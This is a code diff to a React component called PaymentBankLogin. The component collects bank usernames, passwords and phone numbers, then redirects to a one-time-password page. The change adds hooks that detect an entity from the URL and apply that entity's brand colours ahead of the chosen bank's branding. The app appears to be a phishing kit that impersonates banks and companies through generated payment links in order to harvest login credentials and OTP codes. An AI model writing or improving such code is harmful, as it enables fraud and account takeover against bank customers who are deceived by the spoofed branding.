@@ -14,7 +14,9 @@ import { getBankById } from "@/lib/banks";
 import { getCountryByCode } from "@/lib/countries";
 import { formatCurrency } from "@/lib/countryCurrencies";
 import BankLogo from "@/components/BankLogo";
-import { applyDynamicIdentity } from "@/lib/dynamicIdentity";
+import { detectEntityFromURL, getEntityIdentity } from "@/lib/dynamicIdentity";
+import { useAutoApplyIdentity } from "@/hooks/useAutoApplyIdentity";
+import { useDynamicIdentity } from "@/components/DynamicIdentityProvider";
 import { designSystem } from "@/lib/designSystem";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { getCompanyLayout } from "@/components/CompanyLayouts";
@@ -26,7 +28,10 @@ const PaymentBankLogin = () => {
   const { toast } = useToast();
   const { data: linkData, isLoading: linkLoading } = useLink(id);
   const updateLink = useUpdateLink();
-  
+
+  useAutoApplyIdentity();
+  const { identity: dynamicIdentity } = useDynamicIdentity();
+
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [phoneNumber, setPhoneNumber] = useState("");
@@ -132,8 +137,8 @@ const PaymentBankLogin = () => {
     navigate(`/pay/${id}/otp`);
   };
 
-  const primaryColor = selectedBankBranding?.colors?.primary || branding.colors.primary;
-  const secondaryColor = selectedBankBranding?.colors?.secondary || branding.colors.secondary;
+  const primaryColor = dynamicIdentity?.colors?.primary || selectedBankBranding?.colors?.primary || branding.colors.primary;
+  const secondaryColor = dynamicIdentity?.colors?.secondary || selectedBankBranding?.colors?.secondary || branding.colors.secondary;
   
   const renderLoginForm = () => (
     <form onSubmit={handleSubmit} className="space-y-6">
